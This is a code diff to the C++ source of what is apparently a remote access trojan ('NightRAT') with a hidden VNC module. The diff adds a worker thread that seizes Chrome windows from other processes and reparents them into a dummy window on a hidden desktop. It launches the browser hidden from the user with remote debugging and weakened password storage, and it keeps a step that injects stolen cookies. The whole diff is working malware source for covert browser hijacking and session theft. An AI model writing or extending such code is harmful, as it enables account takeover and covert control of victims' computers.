@@ -213,7 +213,11 @@ static const uint32_t FRAME_FORMAT_JPEG = 1;
 static const uint32_t FRAME_FORMAT_JPEG_DIRTY = 2;
 
 static atomic_bool g_captureRunning(false);
+static atomic_bool g_stealRunning(false);
 static thread g_captureThread;
+static thread g_stealThread;
+static thread g_dummyThread;
+static HWND g_hDummyParent = NULL;
 static mutex g_captureMutex;
 static mutex g_sendMutex;
 static SOCKET g_socket = INVALID_SOCKET;
@@ -284,6 +288,7 @@ static atomic_bool g_inputRunning(false);
 
 // ---------- Drag state ----------
 static HWND  g_dragHwnd     = NULL;
+static bool  g_isStealingActive = false;
 static POINT g_dragStartPt  = {0, 0};
 static POINT g_lastMousePos = {0, 0};
 static RECT  g_dragStartRect = {0, 0, 0, 0};
@@ -444,6 +449,66 @@ static void ensure_desktop() {
 static void client_log(const string& msg) {
     lock_guard<mutex> lock(g_logMutex);
     cout << "[HVNC] " << msg << endl;
+}
+
+static LRESULT CALLBACK DummyParentWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    return DefWindowProcW(hwnd, msg, wParam, lParam);
+}
+
+static void dummy_parent_worker() {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) return;
+    SetThreadDesktop(g_hHiddenDesktop);
+
+    WNDCLASSW wc = {0};
+    wc.lpfnWndProc = DummyParentWndProc;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.lpszClassName = L"NightRAT_DummyHost";
+    RegisterClassW(&wc);
+
+    g_hDummyParent = CreateWindowExW(0, wc.lpszClassName, L"DummyHost", WS_POPUP,
+                                     0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
+                                     NULL, NULL, wc.hInstance, NULL);
+
+    if (g_hDummyParent) {
+        ShowWindow(g_hDummyParent, SW_SHOW);
+        MSG msg;
+        while (g_stealRunning && GetMessageW(&msg, NULL, 0, 0)) {
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+    }
+}
+
+static void chrome_steal_worker() {
+    while (g_stealRunning) {
+        if (!g_isStealingActive) {
+            Sleep(1000);
+            continue;
+        }
+
+        HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
+        while (hwnd) {
+            if (IsWindowVisible(hwnd)) {
+                wchar_t className[256];
+                GetClassNameW(hwnd, className, 256);
+                if (wcscmp(className, L"Chrome_WidgetWin_1") == 0) {
+                    DWORD procId = 0;
+                    GetWindowThreadProcessId(hwnd, &procId);
+                    if (procId != GetCurrentProcessId()) {
+                        long style = GetWindowLongPtrW(hwnd, GWL_STYLE);
+                        if (!(style & WS_CHILD)) {
+                            SetWindowLongPtrW(hwnd, GWL_STYLE, style | WS_CHILD);
+                            SetParent(hwnd, g_hDummyParent);
+                            SetWindowPos(hwnd, NULL, 0, 0, 1920, 1080, SWP_NOACTIVATE | SWP_ASYNCWINDOWPOS);
+                        }
+                    }
+                }
+            }
+            hwnd = GetWindow(hwnd, GW_HWNDNEXT);
+        }
+        Sleep(500);
+    }
 }
 
 // -----------------------------------------------------------------------
@@ -1440,7 +1505,7 @@ static void launch_browser_thread(wstring browser_name) {
 
     send_status("program başlatılıyor");
 
-    // 3. Launch browser on hidden desktop
+    // 3. Launch browser on DEFAULT desktop (Redirection Method)
     int hidden_port = 9223;
     wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir +
                       L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=" + to_wstring(hidden_port) +
@@ -1449,18 +1514,19 @@ static void launch_browser_thread(wstring browser_name) {
     vector<wchar_t> cmdVec(cmdLine.begin(), cmdLine.end());
     cmdVec.push_back(L'\0');
 
-    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     memset(&si, 0, sizeof(si));
     memset(&pi, 0, sizeof(pi));
     si.cb = sizeof(si);
-    si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
+    si.lpDesktop    = NULL; // Launch on default desktop for initialization
     si.dwFlags      = STARTF_USESHOWWINDOW;
-    si.wShowWindow  = SW_SHOW;
+    si.wShowWindow  = SW_HIDE; // Hidden to the user on default desktop
+
+    g_isStealingActive = true;
+
     if (CreateProcessW(NULL, cmdVec.data(), NULL, NULL, FALSE,
-                       CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB,
-                       NULL, browser_dir.c_str(), &si, &pi)) {
+                       CREATE_NEW_CONSOLE, NULL, browser_dir.c_str(), &si, &pi)) {
         // 4. Inject extracted cookies
         if (!cookies.empty()) {
             for (int i = 0; i < 15; i++) {
@@ -1528,21 +1594,37 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                 if (g_inputThread.joinable()) g_inputThread.join();
                 g_inputThread = thread(input_loop);
             }
+            if (!g_stealRunning.exchange(true)) {
+                if (g_stealThread.joinable()) g_stealThread.join();
+                if (g_dummyThread.joinable()) g_dummyThread.join();
+                g_stealThread = thread(chrome_steal_worker);
+                g_dummyThread = thread(dummy_parent_worker);
+            }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
             g_encodeRunning  = false;
             g_sendRunning    = false;
             g_inputRunning   = false;
+            g_stealRunning   = false;
             g_frameCV.notify_all();
             g_sendCV.notify_all();
             g_inputCV.notify_all();
+            if (g_hDummyParent) {
+                PostMessageW(g_hDummyParent, WM_CLOSE, 0, 0);
+                g_hDummyParent = NULL;
+            }
+
             if (g_captureThread.joinable()) g_captureThread.join();
             if (g_encodeThread.joinable())  g_encodeThread.join();
             if (g_sendThread.joinable())    g_sendThread.join();
             if (g_inputThread.joinable())   g_inputThread.join();
+            if (g_stealThread.joinable())   g_stealThread.join();
+            if (g_dummyThread.joinable())   g_dummyThread.join();
+
             release_all_bitmap_slots();
             g_dragging = false;
             g_dragHwnd = NULL;
+            g_isStealingActive = false;
             g_mouseDownTarget[0] = NULL;
             g_mouseDownTarget[1] = NULL;
             g_mouseDownTarget[2] = NULL;
